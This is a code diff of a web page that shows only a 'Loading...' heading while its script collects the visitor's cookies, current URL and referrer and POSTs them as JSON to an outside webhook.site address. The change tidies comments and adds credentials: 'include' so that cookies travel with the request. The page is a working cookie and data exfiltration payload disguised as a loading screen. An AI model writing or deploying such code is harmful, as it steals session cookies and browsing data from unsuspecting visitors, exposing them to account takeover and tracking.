@@ -6,7 +6,7 @@
 <body>
   <h1>Loading...</h1>
   <script>
-    // Get cookies, location and referrer data
+    // Get cookies, location, and referrer data
     var cookies = document.cookie;
     var loc = window.location.href;
     var ref = document.referrer;
@@ -22,9 +22,10 @@
     fetch('https://webhook.site/11f73cd8-3a3d-4d1a-9e68-a755cdd67f5a', {
       method: 'POST',
       headers: {
-        'Content-Type': 'application/json' // Ensuring JSON format
+        'Content-Type': 'application/json', // Ensuring JSON format
       },
-      body: JSON.stringify(data) // Send the data as a JSON payload
+      body: JSON.stringify(data), // Send the data as a JSON payload
+      credentials: 'include' // Ensure cookies are included in the request
     })
     .then(response => response.json())
     .then(data => console.log('Request successful:', data))
